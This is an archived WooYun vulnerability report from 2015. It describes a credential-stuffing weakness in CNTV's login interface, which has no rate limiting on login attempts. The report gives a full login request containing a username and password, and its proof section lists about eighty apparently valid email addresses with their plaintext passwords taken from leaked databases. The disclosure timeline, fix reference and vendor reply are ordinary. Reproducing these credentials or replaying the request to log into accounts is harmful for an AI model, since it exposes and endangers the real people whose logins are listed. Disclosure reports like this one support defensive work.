{"id": 32858, "wybug_id": "wooyun-2015-0109317", "wybug_title": "中国网络电视台某接口撞库泄露用户登录凭据(有账号证明)", "wybug_corp": "中国网络电视台", "wybug_author": "路人甲", "wybug_date": "2015-04-21 10:40", "wybug_open_date": "2015-06-06 16:00", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["撞库"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-06：\t细节向公众公开  简要描述： 撞库扫号攻击已经是Top 10 Security Risks for 2014之一.撞库以大量的用户数据为基础，利用用户相同的注册习惯（相同的用户名和密码），尝试登陆其它的网站。2011年，互联网泄密事件引爆了整个信息安全界，导致传统的用户+密码认证的方式已无法满足现有安全需求。泄露数据包括：天涯：31,758,468条，CSDN：6,428,559条，微博：4,442,915条，人人网：4,445,047条，猫扑：2,644,726条，178：9,072,819条，嘟嘟牛：13,891,418条，7K7K：18,282,404条，共1.2亿条。不管你的网站密码保护的多好，但是面对已经泄露的账号密码，撞库扫号防御还是一个相当重要的环节。 详细说明：      主站登录接口没有防御撞库。对登录接口的调用没有进行限制。经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号登录接口如下：\nGET /login/login.action?callback=jsonp1429535557696&version=2.0&username=jmzghmail@163%2enet&password=zgh528600&service=client_transaction&from=http%3A%2F%2Fwww.cntv.cn&remuser= HTTP/1.1Host: reg.cntv.cnConnection: closeAccept: */*User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36Referer: http://www.cntv.cn/Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: vjuids=-2b616c25.14cd6f58acd.0.c72f1a35; vjlast=1429535558.1429535558.30; __gads=ID=bf575848ac94be76:T=1429535556:S=ALNI_Ma1yKV2524N_yFqOTp8U9-gaReoWQ; wdcid=74128945bf164df6RA-Ver: 2.9.0RA-Sid: 7B9DD012-20150303-080129-82895f-fb68a9AlexaToolbar-ALX_NS_PH: AlexaToolbar/alxg-3.3\n   漏洞证明：  经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号.\n570917834@qq.com\thuang19891002619364646@qq.com\tdudu144881hzcsyrz@163.com\thzcsyrz45nierongkdc@qq.com\tnierongkdc1020lwb_6666@163.com\tlwbddnswhuweiblue_911@sina.com\t206811911297243545@qq.com\tyuan5226578danny_just@163.com\t19800717xiaowen1988@qq.com\t89704141988sunch521@126.com\tsunch521webo@tom.com\twebo123pp13036718@qq.com\taiwind1314heng19861229@163.com\theng1025zihuanmayan2007@126.com\tzihuanmayan2007hulaxm@163.com\t64686305znsdcr@sina.com\tzn3358255mtzs@qq.com\t669805604fragilemeteora@163.com\tdeadrubbishzhanghl@netease.com\t720705timath@sohu.com\t19831210kevin_h_xu@hotmail.com\txujin1028316934550@qq.com\t123456liusamuel1989@163.com\t19890620caozengrong@qq.com\t13835920734hf0515@163.com\tcool1980547770328@qq.com\tzihuangstardawei4230@sina.com\t3674576ydwwsx0376@126.com\twsx630524lionqlr@163.com\t10131013gaolao@sina.com\twtuuemcdalinsky@21cn.com\t263313jfstudio@gmail.com\t8h75ct4swjoin@126.com\t123456enetwell@163.com\trs791004296577592@qq.com\t296577592369756826@qq.com\t6967446skysea1_2@sina.com\tseayellowaiqingvip@sina.com\t422828598zengqunsheng@126.com\tzqs6781376vickyngai@yahoo.com.hk\t92540819tcpx2005@126.com\t5623488tcpxliuxuesong@126.com\t62514290waga510@yahoo.cn\ttiger19880510420926155@qq.com\t1314loveuzhangxuyang198911@163.com\tqq512207639967332@qq.com\tcaoenmingqw507730@163.com\t12354321wintrysea@gamesong.net\tj714285xwjiajianwei163@163.com\t5808177024zengguang888@tom.com\tAS123456xiaoshufen2008@163.com\t13972688068aken0820@126.com\t42142130999hbati@163.com\t0733601bziyun1200@yahoo.com.cn\t147258369yihanjiuyueweiyang@126.com\twoaini9125215w4y3x@163.com\t388612614517011868@qq.com\tgb19841202419482820@qq.com\tDRT31520412671872642@qq.com\t87831411277605887@qq.com\tweeking2008cwzxhlsl@163.com\t19840330lp2433@qq.com\t369258174yu_chen78@126.com\t781116152upuphappy@126.com\t123zhang123htlr@21cn.com\twangjiaxilihuke007@163.com\t5487690000pannogood@qq.com\t11111111fujj_110@163.com\t86652241465479631@qq.com\t46925959xiaoru168@vip.qq.com\taihui22316shukong0721@qq.com\t1988228582580qiaojunlee@yeah.net\tliqiaojunjmzghmail@163.net\tzgh52860038697901@qq.com\t12031277hyqclcls@163.com\thuayinqiu13579dsglhc@126.com\tdsglhc130182wodeln@163.com\tlina521521\n\n\n\n\n   修复方案：  撞库防御参考资料:http://stayliv3.github.io/2015/04/15/%E6%92%9E%E5%BA%93%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88/   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-04-22 15:59 厂商回复： 非常感谢，我们将尽快进行该业务的整改！～～感谢您对我们的支持和帮助！～～～ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}